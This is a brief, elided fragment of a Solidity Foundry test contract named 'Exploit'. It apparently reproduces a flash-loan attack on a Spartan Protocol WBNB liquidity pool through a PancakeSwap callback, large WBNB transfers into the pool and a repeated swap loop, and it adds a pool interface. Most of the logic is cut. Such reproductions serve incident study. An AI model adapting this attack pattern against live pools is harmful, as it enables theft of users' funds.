...
contract Exploit is Test {
    ...
    function pancakeCall(address, uint256, uint256 amount1, bytes calldata) external {
        ...
        WBNB.transfer(address(SPT1_WBNB), 11853.33 ether);
        ...
        WBNB.transfer(address(SPT1_WBNB), 21632.14 ether);
        ...
        uint swapAmount = SPARTA.balanceOf(address(this)) / 10;
        for(uint i; i < 9; ++i) {
...
interface ISpartanPool {
    function swapTo(address token, address member) external payable returns (uint outputAmount, uint fee);
    function addLiquidity() external returns (uint liquidityUnits);
